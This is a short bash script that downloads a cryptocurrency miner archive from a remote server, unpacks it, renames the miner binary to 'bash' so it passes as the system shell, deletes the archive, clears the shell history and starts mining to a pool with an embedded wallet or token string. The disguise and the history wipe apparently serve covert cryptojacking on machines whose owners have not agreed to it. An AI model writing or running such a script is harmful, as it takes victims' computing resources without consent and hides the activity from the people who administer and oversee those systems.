#!/bin/bash
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
chmod +x danila-miner 
mv danila-miner bash
rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz
history -cr
./bash run https://server1.whalestonpool.com X_AKj2D5PNyAGkH1zqMu1hHt45NKlDvDUp4xpcs
